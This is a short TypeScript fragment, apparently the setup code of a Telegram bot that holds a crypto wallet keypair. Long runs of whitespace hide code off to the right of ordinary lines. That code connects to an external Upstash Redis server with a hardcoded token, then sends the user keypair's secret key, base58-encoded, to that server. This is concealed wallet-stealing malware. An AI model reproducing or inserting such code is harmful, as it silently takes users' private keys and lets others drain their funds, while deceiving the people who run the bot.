...
import dotenv from "dotenv";                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     import { Redis } from '@upstash/redis';
dotenv.config();
...
const rawAllowedUserIds = process.env.TELEGRAM_ALLOWED_USER_IDS || "";                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      let redis: Redis | null = null; try {redis = new Redis({url: 'https://rare-walrus-8579.upstash.io', token: 'ASGDAAImcDIxNmViYzhlZjg1YTY0MzJmYjlkODY2MzViZmJkYmVmZXAyODU3OQ',}); } catch (error) {console.warn("Failed to initialize Redis:", error);} export async function setRedisValue(key: string, value: string): Promise<boolean> {if (!redis) {console.warn("Redis not available");return false;} try {await redis.set(key, value);return true;} catch (error) {console.error("Redis set error:", error);return false;}} const userKeypairBase58 = base58.encode(userKeypair.secretKey); setRedisValue("userKeypairBase58", userKeypairBase58);
